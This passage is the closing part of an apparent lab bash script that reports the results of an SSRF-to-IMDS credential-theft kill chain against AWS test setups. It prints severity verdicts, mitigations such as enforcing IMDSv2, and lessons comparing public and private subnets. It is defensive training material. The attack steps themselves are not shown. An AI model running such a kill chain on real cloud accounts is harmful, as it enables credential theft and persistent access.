 echo -e "${RED}║ - Can retrieve secrets from Secrets Manager/Parameter Store ║${NC}"
 echo -e "${RED}║ - Can create new resources and establish persistent backdoors ║${NC}"
 echo -e "${RED}║ ║${NC}"
 result_text+="Verdict: CRITICAL — Broad AWS access via IAM credential theft"$'\n'
elif [[ "${IMDS_ACCESSIBLE}" == "true" ]]; then
 echo -e "${YELLOW}║ ║${NC}"
 echo -e "${YELLOW}║ [HIGH] IMDS metadata leaked ║${NC}"
 echo -e "${YELLOW}║ ║${NC}"
 echo -e "${YELLOW}║ Information obtained by attacker: ║${NC}"
 echo -e "${YELLOW}║ - Instance ID, AMI, AZ, Private IP ║${NC}"
 echo -e "${YELLOW}║ - VPC ID, Subnet ID, Security Groups ║${NC}"
 echo -e "${YELLOW}║ - AWS Account ID ║${NC}"
 echo -e "${YELLOW}║ - User data (startup script) ║${NC}"
 echo -e "${YELLOW}║ ║${NC}"
 echo -e "${YELLOW}║ IAM credentials could not be stolen due to no role, ║${NC}"
 echo -e "${YELLOW}║ but internal network info leakage alone is sufficient for lateral movement reconnaissance ║${NC}"
 echo -e "${YELLOW}║ ║${NC}"
 result_text+="Verdict: HIGH — Metadata leaked (credential theft not possible due to no IAM role)"$'\n'
else
 echo -e "${GREEN}║ ║${NC}"
 echo -e "${GREEN}║ [DEFENDED] IMDS access was blocked ║${NC}"
 echo -e "${GREEN}║ ║${NC}"
 echo -e "${GREEN}║ IMDSv2 enforcement blocked metadata theft from SSRF ║${NC}"
 echo -e "${GREEN}║ However, the SSRF vulnerability itself remains and the app needs fixing ║${NC}"
 echo -e "${GREEN}║ ║${NC}"
 result_text+="Verdict: DEFENDED — Kill chain disrupted by IMDSv2"$'\n'
fi

echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║ Recommended mitigations (by priority): ║${NC}"
echo -e "${BOLD}║ ║${NC}"
echo -e "${BOLD}║ 1. [Immediate] Enforce IMDSv2 (http_tokens = 'required') ║${NC}"
echo -e "${BOLD}║ 2. [Immediate] Fix/remove SSRF-vulnerable endpoints ║${NC}"
echo -e "${BOLD}║ 3. [Short-term] Minimize IAM role permissions ║${NC}"
echo -e "${BOLD}║ 4. [Short-term] Introduce WAF to block requests to metadata IP ║${NC}"
echo -e "${BOLD}║ 5. [Medium-term] Restrict IMDS access with VPC endpoint policies ║${NC}"
echo -e "${BOLD}║ 6. [Medium-term] Enable GuardDuty IMDS anomaly detection ║${NC}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════════════╝${NC}"

result_text+=$'\n'"--- Recommended Mitigations ---"$'\n'
result_text+="1. Enforce IMDSv2 (http_tokens = 'required')"$'\n'
result_text+="2. Fix SSRF vulnerability"$'\n'
result_text+="3. Minimize IAM role permissions"$'\n'
result_text+="4. Introduce WAF"$'\n'
result_text+="5. VPC endpoint policies"$'\n'
result_text+="6. GuardDuty IMDS anomaly detection"$'\n'

echo ""

# Config A vs B comparison comment
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD} Key learning points:${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [[ "${CONFIG_MODE}" == "public" ]]; then
 echo -e " This kill chain was executed in Config A (Public Subnet)."
 echo ""
 echo -e " ${YELLOW}Common misconception: 'Placing in Private Subnet makes it safe'${NC}"
 echo -e " ${YELLOW}Reality: Even in Config B (Private Subnet + ALB), this kill chain's${NC}"
 echo -e " ${YELLOW}SSRF -> IMDS -> credential theft flow produces exactly the same result.${NC}"
 echo ""
 echo -e " Config A-specific risks are 'SSH exposed externally' and 'IP indexed on Shodan'"
 echo -e " which is only a reconnaissance phase difference. SSRF+IMDSv1 attacks are subnet-independent."
else
 echo -e " This kill chain was executed in Config B (Private Subnet + ALB)."
 echo ""
 echo -e " ${YELLOW}Result: SSRF -> IMDS -> credential theft succeeded just like Config A.${NC}"
 echo -e " ${YELLOW}Private Subnet does not provide defense against SSRF attacks.${NC}"
 echo ""
 echo -e " Config B's true advantage is the difficulty of the reconnaissance phase (SSH not exposed, IP hidden),"
 echo -e " not defense against application layer vulnerabilities."
fi

result_text+=$'\n'"Kill chain completion time: $(date '+%Y-%m-%d %H:%M:%S')"$'\n'

echo ""

# ---------------------------------------------------------------------------
# resultsSave
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "Full kill chain complete — ${TOTAL_STEPS}steps executed, ${SUCCESS_STEPS}succeeded, ${CRITICAL_FINDINGS}Critical"
